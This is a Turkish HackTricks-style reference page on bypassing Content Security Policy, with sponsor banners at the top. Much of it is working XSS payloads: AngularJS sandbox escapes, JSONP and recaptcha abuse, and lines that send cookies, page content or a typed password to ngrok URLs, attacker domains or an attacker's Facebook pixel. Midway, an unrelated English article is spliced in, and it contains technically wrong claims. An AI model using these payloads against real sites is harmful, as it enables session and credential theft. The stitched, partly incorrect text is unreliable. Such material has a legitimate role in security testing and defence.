# İçerik Güvenlik Politikası (CSP) Atlatma

<details>

<summary><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi **HackTricks'te reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek** katkıda bulunun.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve ödül avcıları ile iletişim kurmak için [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın!

**Hacking İçgörüleri**\
Hacking'in heyecanına ve zorluklarına dalmış içeriklerle etkileşim kurun

**Gerçek Zamanlı Hack Haberleri**\
Hızlı tempolu hacking dünyasını gerçek zamanlı haberler ve içgörülerle takip edin

**En Son Duyurular**\
Yeni başlayan hata ödülleri ve önemli platform güncellemeleri hakkında bilgi sahibi olun

**Bize katılın** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugün en iyi hackerlarla işbirliği yapmaya başlayın!

## CSP Nedir

İçerik Güvenlik Politikası (CSP), öncelikle **cross-site scripting (XSS) gibi saldırılara karşı koruma sağlamayı amaçlayan** bir tarayıcı teknolojisi olarak tanınır. Tarayıcı tarafından güvenli bir şekilde yüklenen kaynakların yollarını ve kaynakları tanımlayarak çalışır. Bu kaynaklar, resimler, çerçeveler ve JavaScript gibi bir dizi öğeyi kapsar. Örneğin, bir politika, aynı etki alanından (self) kaynakların yüklenmesine ve yürütülmesine izin verebilir, içerideki kaynaklara ve `eval`, `setTimeout` veya `setInterval` gibi işlevler aracılığıyla dize kodunun yürütülmesine izin verebilir.

CSP'nin uygulanması, **yanıt başlıkları** aracılığıyla veya HTML sayfasına **meta öğeleri ekleyerek** gerçekleştirilir. Bu politikaya uygun olarak, tarayıcılar bu şartları proaktif olarak uygular ve tespit edilen ihlalleri hemen engeller.

- Yanıt başlığı aracılığıyla uygulanır:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
- Meta etiketi aracılığıyla uygulanır:
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### Başlıklar

CSP, bu başlıklar kullanılarak zorunlu hale getirilebilir veya izlenebilir:

* `Content-Security-Policy`: CSP'yi zorlar; tarayıcı herhangi bir ihlali engeller.
* `Content-Security-Policy-Report-Only`: İzleme için kullanılır; ihlalleri engellemeden raporlar. Ön üretim ortamlarında test etmek için idealdir.

### Kaynakları Tanımlama

CSP, etkin ve pasif içeriği yükleme için kökenleri kısıtlar ve içerisinde `eval()` kullanımı gibi konuları kontrol eder. Bir örnek politika şu şekildedir:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Yönergeler

* **script-src**: URL'ler, içe gömülü betikler ve olay işleyicileri veya XSLT stil sayfaları tarafından tetiklenen betikler de dahil olmak üzere JavaScript için belirli kaynakları izin verir.
* **default-src**: Belirli getirme yönergeleri yokken kaynakları getirmek için varsayılan bir politika belirler.
* **child-src**: Web işçileri ve gömülü çerçeve içerikleri için izin verilen kaynakları belirtir.
* **connect-src**: fetch, WebSocket, XMLHttpRequest gibi arabirimler kullanılarak yüklenebilecek URL'leri sınırlar.
* **frame-src**: Çerçeveler için URL'leri sınırlar.
* **frame-ancestors**: Geçerli sayfayı gömebilecek kaynakları belirtir, `<frame>`, `<iframe>`, `<object>`, `<embed>` ve `<applet>` gibi öğeler için geçerlidir.
* **img-src**: Resimler için izin verilen kaynakları tanımlar.
* **font-src**: `@font-face` kullanılarak yüklenen yazı tipleri için geçerli kaynakları belirtir.
* **manifest-src**: Uygulama belirteç dosyalarının izin verilen kaynaklarını tanımlar.
* **media-src**: Medya nesnelerini yüklemek için izin verilen kaynakları tanımlar.
* **object-src**: `<object>`, `<embed>` ve `<applet>` öğeleri için izin verilen kaynakları tanımlar.
* **base-uri**: `<base>` öğeleri kullanılarak yükleme için izin verilen URL'leri belirtir.
* **form-action**: Form gönderimleri için geçerli uç noktaları listeler.
* **plugin-types**: Bir sayfanın çağırabileceği mime türlerini sınırlar.
* **upgrade-insecure-requests**: Tarayıcılara HTTP URL'lerini HTTPS'ye yeniden yazmalarını söyler.
* **sandbox**: `<iframe>`'in sandbox özniteliğiyle benzer kısıtlamalar uygular.
* **report-to**: Politika ihlal edildiğinde raporun gönderileceği bir grup belirtir.
* **worker-src**: Worker, SharedWorker veya ServiceWorker betikleri için geçerli kaynakları belirtir.
* **prefetch-src**: Alınacak veya önceden alınacak kaynaklar için geçerli kaynakları belirtir.
* **navigate-to**: Bir belgenin herhangi bir şekilde (a, form, window.location, window.open, vb.) gezinebileceği URL'leri sınırlar.


### Kaynaklar

* `*`: `data:`, `blob:`, `filesystem:` şemalarına sahip URL'ler dışında tüm URL'lere izin verir.
* `'self'`: Aynı etki alanından yükleme yapmaya izin verir.
* `'data'`: Kaynakların veri şeması üzerinden yüklenmesine izin verir (örneğin, Base64 kodlu resimler).
* `'none'`: Herhangi bir kaynaktan yükleme yapmayı engeller.
* `'unsafe-eval'`: `eval()` ve benzeri yöntemlerin kullanımına izin verir, güvenlik nedenleriyle önerilmez.
* `'unsafe-hashes'`: Belirli içe gömülü olay işleyicilerini etkinleştirir.
* `'unsafe-inline'`: İçe gömülü `<script>` veya `<style>` gibi kaynakların kullanımına izin verir, güvenlik nedenleriyle önerilmez.
* `'nonce'`: Kriptografik bir nonce (bir kez kullanılan sayı) kullanarak belirli içe gömülü betiklere beyaz liste oluşturur.
* `'sha256-<hash>'`: Belirli bir sha256 karma değeri olan betikleri beyaz listeye alır.
* `'strict-dynamic'`: Bir nonce veya karma tarafından beyaz listeye alınmışsa herhangi bir kaynaktan betik yüklenmesine izin verir.
* `'host'`: `example.com` gibi belirli bir ana bilgisayar belirtir.
* `https:`: HTTPS kullanan URL'leri sınırlar.
* `blob:`: Blob URL'lerinden kaynakların yüklenmesine izin verir (örneğin, JavaScript tarafından oluşturulan Blob URL'leri).
* `filesystem:`: Dosya sisteminden kaynakların yüklenmesine izin verir.
* `'report-sample'`: İhlal raporunda ihlal eden kodun bir örneğini içerir (hata ayıklama için kullanışlıdır).
* `'strict-origin'`: 'self' ile benzerdir, ancak kaynakların protokol güvenlik düzeyinin belgeyle eşleştiğinden emin olur (yalnızca güvenli kökenler güvenli kökenlerden kaynak yükleyebilir).
* `'strict-origin-when-cross-origin'`: Aynı köken istekleri yaparken tam URL'leri gönderir, ancak istek çapraz kökenli olduğunda yalnızca kökeni gönderir.
* `'unsafe-allow-redirects'`: Hemen başka bir kaynağa yönlendirecek kaynakların yüklenmesine izin verir. Güvenlik zayıflatıldığı için önerilmez.


## Güvensiz CSP Kuralları

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Çalışan payload: `"/><script>alert(1);</script>`

#### Iframe'lar aracılığıyla self + 'unsafe-inline'

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Çalışan yük:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

Eğer bir şekilde izin verilen bir JS kodu, JS kodunuzla birlikte DOM'da yeni bir script etiketi oluşturursa, izin verilen bir betik tarafından oluşturulduğu için **yeni script etiketi çalıştırılmaya izin verilecektir**.

### Joker (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Çalışan yük:
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### object-src ve default-src eksikliği

{% hint style="danger" %}
**Bu artık çalışmıyor gibi görünüyor**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
Çalışan yükler:
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### Dosya Yükleme + 'self'

Bu yöntem, bir web uygulamasının içerik güvenlik politikasını (Content Security Policy - CSP) atlayarak dosya yükleme işlemini gerçekleştirmek için kullanılır. CSP, web uygulamalarında XSS saldırılarını önlemek için kullanılan bir güvenlik mekanizmasıdır. 'self' ifadesi, web uygulamasının kendi kaynaklarına erişim izni verir.

Bu yöntemi kullanmak için, hedef web uygulamasında bir dosya yükleme işlemi gerçekleştirilirken, CSP politikasında 'self' ifadesinin bulunması gerekmektedir. Bu durumda, saldırgan, dosyayı yüklemek için 'self' ifadesini kullanarak CSP politikasını atlayabilir.

Örneğin, aşağıdaki CSP politikası:

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';
```

Bu politikada, 'self' ifadesi, kaynakların yalnızca web uygulamasının kendi alanından yüklenmesine izin verir. Saldırgan, bu politikayı atlamak için dosyayı yüklemek için 'self' ifadesini kullanabilir.

Bu yöntem, web uygulamasının CSP politikasının zayıf bir şekilde yapılandırıldığı durumlarda etkili olabilir. Ancak, güvenlik açığı tespit edildiğinde, web uygulamasının CSP politikasının güncellenmesi gerekmektedir.
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
Eğer bir JS dosyası yükleyebiliyorsanız, bu CSP'yi atlayabilirsiniz:

Çalışan payload:
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
Ancak, sunucunun **yüklenen dosyayı doğruladığı ve yalnızca belirli türde dosyaların yüklenmesine izin verdiği** oldukça olasıdır.

Dahası, sunucu tarafından kabul edilen bir uzantıyla (_script.png_ gibi) bir dosyanın içine **JS kodu yükleyebilseniz bile**, bu yeterli olmayacaktır çünkü apache sunucusu gibi bazı sunucular, dosyanın uzantısına dayanarak **dosyanın MIME türünü seçer** ve Chrome gibi tarayıcılar, bir resim olması gereken bir şeyin içindeki Javascript kodunu **çalıştırmayı reddeder**. "Neyse ki", hatalar var. Örneğin, bir CTF'den öğrendiğim gibi **Apache, .wave uzantısını bilmez**, bu yüzden audio/\* gibi bir **MIME türüyle sunmaz**.

Buradan, bir XSS ve dosya yükleme bulursanız ve **yanlış yorumlanan bir uzantı** bulmayı başarırsanız, o uzantıya sahip bir dosyayı ve betiğin İçeriğini yüklemeyi deneyebilirsiniz. Veya, sunucu yüklenen dosyanın doğru biçimini kontrol ediyorsa, bir poliglot oluşturabilirsiniz ([burada bazı poliglot örnekleri](https://github.com/Polydet/polyglot-database)).

### Üçüncü Taraf Uç Noktaları + ('unsafe-eval')

{% hint style="warning" %}
Aşağıdaki payloadlardan bazıları için **`unsafe-eval` bile gerekli değildir**.
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
Angular'ın güvenlik açığı olan bir sürümünü yükleyin ve keyfi JavaScript kodunu çalıştırın:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Angular + `window` nesnesini döndüren bir kütüphane kullanarak payloadlar ([bu yazıya bakın](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

{% hint style="info" %}
Bu yazı, `cdn.cloudflare.com` (veya izin verilen başka bir JS kütüphane deposu) üzerinden **tüm kütüphaneleri yükleyebileceğinizi**, her bir kütüphaneden eklenen tüm fonksiyonları çalıştırabileceğinizi ve **hangi fonksiyonların hangi kütüphanelerden `window` nesnesini döndürdüğünü** kontrol edebileceğinizi göstermektedir.
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
#### Google recaptcha JS kodunu kötüye kullanma

[**Bu CTF çözümüne**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves) göre, CSP içinde [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) adresini kötüye kullanarak CSP'yi atlayarak keyfi JS kodu çalıştırabilirsiniz:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
### Üçüncü Taraf Uç Noktaları + JSONP

Bir web uygulamasında içerik güvenliği politikası (CSP) kullanılıyorsa, üçüncü taraf uç noktalara erişim engellenebilir. Ancak, JSONP (JSON with Padding) kullanarak bu kısıtlamaları aşmak mümkündür.

JSONP, bir web sayfasının farklı bir etki alanındaki bir sunucudan veri almasına izin veren bir yöntemdir. Bu yöntem, bir `<script>` etiketi kullanarak veriyi alır ve geri çağırma işlevini kullanarak sayfaya ekler. CSP, `<script>` etiketlerinin yalnızca belirli kaynaklardan yüklenmesine izin verdiğinden, JSONP bu kısıtlamaları atlayabilir.

Bir CSP tarafından engellenen bir üçüncü taraf uç noktaya erişmek için, hedef sunucuda JSONP desteği olmalıdır. JSONP desteği sunan bir API kullanarak, hedef sunucuya bir istek gönderilebilir ve yanıt JSONP formatında alınabilir. Bu yanıt, `<script>` etiketi içindeki bir geri çağırma işlevi aracılığıyla sayfaya eklenir.

Bu yöntem, CSP tarafından engellenen üçüncü taraf uç noktalara erişmek için kullanılabilir. Ancak, JSONP'nin güvenlik riskleri olduğunu unutmamak önemlidir. JSONP, XSS (Cross-Site Scripting) saldırılarına yol açabilir ve güvenlik açıklarına neden olabilir. Bu nedenle, JSONP kullanırken dikkatli olunmalı ve güvenlik önlemleri alınmalıdır.
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Aşağıdaki gibi senaryolarda, `script-src` `self` ve belirli bir etki alanına ayarlandığında, JSONP kullanılarak bypass edilebilir. JSONP uç noktaları, güvensiz geri çağırma yöntemlerine izin verir ve saldırganın XSS gerçekleştirmesine olanak tanır, çalışan payload:
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **farklı web sitelerinin CSP bypass için kullanılmaya hazır JSONP uç noktalarını içerir.**

Aynı zafiyet, **güvenilir uç nokta bir Açık Yönlendirme içeriyorsa** meydana gelecektir çünkü başlangıç uç noktası güvenilir ise yönlendirmeler de güvenilir kabul edilir.

### Üçüncü Taraf Kötüye Kullanımlar
Aşağıdaki [gönderide](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses) açıklandığı gibi, CSP'de izin verilen birçok üçüncü taraf alanı, veri sızdırmak veya JavaScript kodu çalıştırmak için kötüye kullanılabilir. Bu üçüncü taraflardan bazıları şunlardır:

| Kuruluş | İzin Verilen Alan | Yetenekler |
|--------|----------------|--------------|
| Facebook | www.facebook.com, *.facebook.com | Veri Sızdırma |
| Hotjar | *.hotjar.com, ask.hotjar.io | Veri Sızdırma |
| Jsdelivr | *.jsdelivr.com, cdn.jsdelivr.net | Çalıştırma |
| Amazon CloudFront | *.cloudfront.net | Veri Sızdırma, Çalıştırma |
| Amazon AWS | *.amazonaws.com | Veri Sızdırma, Çalıştırma |
| Azure Websites | *.azurewebsites.net, *.azurestaticapps.net | Veri Sızdırma, Çalıştırma |
| Salesforce Heroku	| *.herokuapp.com | Veri Sızdırma, Çalıştırma |
| Google Firebase | *.firebaseapp.com | Veri Sızdırma, Çalıştırma |

Hedefinizin CSP'sinde izin verilen alanlardan herhangi birini bulursanız, üçüncü taraf hizmetine kaydolarak CSP'yi atlayabilir ve ya veriyi bu hizmete sızdırabilir ya da kodu çalıştırabilirsiniz.

Örneğin, aşağıdaki CSP'yi bulursanız:
```
Content-Security-Policy​: default-src 'self’ www.facebook.com;​
```
# Content Security Policy (CSP) Bypass

Content Security Policy (CSP) is a security mechanism implemented by web applications to mitigate the risk of cross-site scripting (XSS) attacks. CSP allows web developers to specify which resources (such as scripts, stylesheets, and images) are allowed to be loaded and executed on a web page. However, there are certain techniques that can be used to bypass CSP and potentially exploit vulnerabilities in the application.

## Bypassing CSP using Inline Scripts

CSP typically restricts the execution of inline scripts, which are scripts embedded directly within HTML tags. However, there are several ways to bypass this restriction:

1. **Event Handlers**: By using event handlers such as `onload` or `onclick`, it is possible to execute arbitrary JavaScript code inline. For example:

```html
<img src="image.jpg" onload="alert('XSS')">
```

2. **Data URIs**: Data URIs allow embedding data directly into the HTML document. By using a data URI with a `script` tag, it is possible to execute inline JavaScript code. For example:

```html
<img src="data:image/svg+xml,<svg/onload=alert('XSS')>">
```

3. **`javascript:` URL scheme**: The `javascript:` URL scheme allows executing JavaScript code directly in the URL. By using this scheme, it is possible to bypass CSP and execute inline scripts. For example:

```html
<a href="javascript:alert('XSS')">Click me</a>
```

## Bypassing CSP using External Scripts

CSP also restricts the loading and execution of external scripts. However, there are techniques that can be used to bypass this restriction:

1. **Whitelisted Domains**: If the CSP policy allows loading scripts from specific domains, it may be possible to find a subdomain or a different domain that is not restricted by CSP. For example, if the CSP policy allows loading scripts from `example.com`, it may be possible to load a script from `subdomain.example.com` or `evil.com`.

2. **Nonce-based CSP**: Some CSP policies use a nonce (a random value) to allow specific inline scripts to be executed. By injecting a script tag with the correct nonce value, it is possible to bypass CSP and execute arbitrary JavaScript code. For example:

```html
<script nonce="randomvalue">alert('XSS')</script>
```

3. **Unsafe Inline Scripts**: In some cases, the CSP policy may allow specific inline scripts to be executed. By injecting a script tag with the `unsafe-inline` attribute, it is possible to bypass CSP and execute arbitrary JavaScript code. For example:

```html
<script src="https://example.com/script.js" nonce="randomvalue"></script>
<script src="https://example.com/script.js" unsafe-inline></script>
```

## Conclusion

Content Security Policy (CSP) is an important security mechanism that helps protect web applications against cross-site scripting (XSS) attacks. However, it is not foolproof, and there are techniques that can be used to bypass CSP. Web developers should be aware of these bypass techniques and take appropriate measures to mitigate the risk of exploitation.
```
Content-Security-Policy​: connect-src www.facebook.com;​
```
Verileri çıkarmanız gerekiyor, [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/) ile her zaman yapıldığı gibi. Bu durumda, genel olarak aşağıdaki adımları izlersiniz:

1. Buradan bir Facebook Geliştirici hesabı oluşturun.
1. Yeni bir "Facebook Girişi" uygulaması oluşturun ve "Web sitesi" seçeneğini seçin.
1. "Ayarlar -> Temel"e gidin ve "Uygulama Kimliği"ni alın.
1. Verileri çıkarmak istediğiniz hedef siteye, Facebook SDK aracı "fbq"yu doğrudan kullanarak ve "customEvent" ve veri yükü ile veri çıkarabilirsiniz.
1. Uygulama "Etkinlik Yöneticisi"ne gidin ve oluşturduğunuz uygulamayı seçin (etkinlik yöneticisi, şu URL'ye benzer bir yerde bulunabilir: https://www.facebook.com/events_manager2/list/pixel/[app-id]/test_events)
1. "Test Etkinlikleri" sekmesini seçerek "sizin" web siteniz tarafından gönderilen etkinlikleri görebilirsiniz.

Ardından, kurban tarafında, aşağıdaki kodu çalıştırarak Facebook izleme pikselini saldırganın Facebook geliştirici hesabı uygulama kimliğine yönlendirmek ve böyle bir özel etkinlik oluşturmak için aşağıdaki kodu çalıştırırsınız:
```JavaScript
fbq('init', '1279785999289471');​ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{​
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"​
});
```
Diğer tabloda belirtilen yedi üçüncü taraf alan adı için, bunları kötüye kullanmanın başka birçok yolu vardır. Diğer üçüncü taraf kötüye kullanımlar hakkında ek açıklamalar için önceki [blog yazısına](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) başvurun.

### RPO (Relative Path Overwrite) ile Geçme <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

Yol kısıtlamalarını atlamak için bahsedilen yönlendirme yönteminin yanı sıra, bazı sunucularda kullanılabilecek başka bir teknik olan Relative Path Overwrite (RPO) tekniği vardır.

Örneğin, CSP `https://example.com/scripts/react/` yoluna izin veriyorsa, aşağıdaki gibi atlanabilir:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
Tarayıcı sonunda `https://example.com/scripts/angular/angular.js` yükleyecektir.

Bu, tarayıcı için `https://example.com/scripts/react/` altında bulunan `..%2fangular%2fangular.js` adlı bir dosya yüklüyormuşsunuz gibi göründüğü için CSP'ye uyumludur.

Sonuç olarak, bunu çözecekler ve `https://example.com/scripts/react/../angular/angular.js` talep edecekler, bu da `https://example.com/scripts/angular/angular.js` ile eşdeğerdir.

Tarayıcı ve sunucu arasındaki URL yorumlama tutarsızlığını **sömürerek, yol kuralları atlatılabilir**.

Çözüm, sunucu tarafında `%2f`'yi `/` olarak işlememektir, böylece tarayıcı ve sunucu arasında tutarlı yorumlama sağlanır ve bu sorun önlenir.

Çevrimiçi Örnek: [ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Iframes JS yürütme

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### eksik **base-uri**

Eğer **base-uri** yönergesi eksikse, [**dangling markup injection**](../dangling-markup-html-scriptless-injection/) gerçekleştirmek için bunu kötüye kullanabilirsiniz.

Ayrıca, eğer **sayfa, bir Nonce kullanarak göreli bir yol** (örneğin `<script src="/js/app.js">`) kullanarak bir betik yüklüyorsa, XSS elde etmek için **base** **tag**'ınızı kullanarak **kendi sunucunuzdan** betiği **yükleyebilirsiniz.**\
Eğer zafiyetli sayfa **httpS** ile yükleniyorsa, base'de bir httpS URL kullanın.
```html
<base href="https://www.attacker.com/">
```
### AngularJS olayları

Bir politika olan İçerik Güvenlik Politikası (CSP), JavaScript olaylarını kısıtlayabilir. Bununla birlikte, AngularJS, özel olaylar sunarak alternatif bir çözüm sunar. Bir olay içinde, AngularJS, tarayıcıdaki olay nesnesine referans olan benzersiz bir `$event` nesnesi sağlar. Bu `$event` nesnesi, CSP'yi atlamak için kullanılabilir. Özellikle Chrome'da, `$event/event` nesnesi, olayın yürütme zincirinde yer alan bir nesne dizisini içeren bir `path` özelliğine sahiptir ve `window` nesnesi her zaman sonunda bulunur. Bu yapı, kum havuzu kaçış taktikleri için önemlidir.

Bu diziyi `orderBy` filtresine yönlendirerek, onun üzerinde döngü oluşturmak ve terminal öğesini (`window` nesnesi) kullanarak `alert()` gibi bir global işlevi tetiklemek mümkündür. Aşağıdaki örnek kod parçacığı, bu süreci açıklar:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
Bu örnek, `ng-focus` direktifinin etkinleştirilmesi için `$event.path|orderBy` kullanımını vurgular. `path` dizisini manipüle etmek için kullanılır ve `window` nesnesini kullanarak `alert()` fonksiyonunu çalıştırır, böylece `document.cookie` ifşa edilir.

**Angular bypaslarını** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) **adresinde bulabilirsiniz.**

### AngularJS ve beyaz listelenen alan adı
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
Bir Angular JS uygulamasında betik yükleme için etki alanlarını beyaz listeye alan bir CSP politikası, geri çağırma işlevlerinin ve belirli zafiyetli sınıfların çağrılması yoluyla atlatılabilir. Bu teknik hakkında daha fazla bilgi, bu [git deposunda](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22) bulunan ayrıntılı bir kılavuzda bulunabilir.

Çalışan yükler:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
Diğer JSONP keyfi yürütme uç noktaları [**burada**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) bulunabilir (bazıları silindi veya düzeltildi)

### Yönlendirme ile Atlatma

CSP, sunucu tarafı yönlendirmesiyle karşılaştığında ne olur? Yönlendirme, izin verilmeyen farklı bir kök dizine yönlendirirse, hala başarısız olur.

Ancak, [CSP spec 4.2.2.3. Yollar ve Yönlendirmeler](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects) bölümünde açıklandığı gibi, yönlendirme farklı bir yola yönlendirirse, orijinal kısıtlamaları atlayabilir.

İşte bir örnek:
```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
Eğer CSP `https://www.google.com/a/b/c/d` olarak ayarlanmışsa, yolun dikkate alındığı için `/test` ve `/a/test` betikleri CSP tarafından engellenecektir.

Ancak, son `http://localhost:5555/301` **sunucu tarafında `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`'e yönlendirilecektir**. Yönlendirme olduğu için **yol dikkate alınmaz** ve **betik yüklenebilir**, böylece yol kısıtlaması atlatılır.

Bu yönlendirme ile yol tamamen belirtilse bile, hala atlatılacaktır.

Bu nedenle, en iyi çözüm, web sitesinin açık yönlendirme açıklarına sahip olmadığından ve CSP kurallarında istismar edilebilecek alan adlarının olmadığından emin olmaktır.

### Dangling markup ile CSP atlatma

[İlgili bilgilere buradan ulaşabilirsiniz](../dangling-markup-html-scriptless-injection/).

### 'unsafe-inline'; img-src \*; ile XSS üzerinden CSP atlatma
```
default-src 'self' 'unsafe-inline'; img-src *;
```
